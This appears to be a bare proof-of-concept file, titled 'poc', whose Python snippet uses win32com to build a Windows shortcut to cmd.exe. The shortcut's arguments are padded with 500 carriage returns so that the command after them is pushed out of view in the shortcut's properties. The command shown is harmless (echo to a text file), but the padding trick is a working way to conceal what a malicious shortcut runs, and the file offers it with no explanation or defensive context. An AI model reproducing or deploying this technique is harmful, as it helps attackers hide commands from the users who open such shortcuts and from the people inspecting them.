# poc



```python
from win32com.client import Dispatch

shell = Dispatch("WScript.Shell")
shortcut = shell.CreateShortcut(r"c:/windows/temp/1.lnk")
shortcut.TargetPath = '%windir%\SysWow64\cmd.exe'
shortcut.WorkingDirectory = "c:/windows/temp/"
shortcut.Arguments = '\r'*500+'/c "echo 111> 1.txt"'
shortcut.save()
```
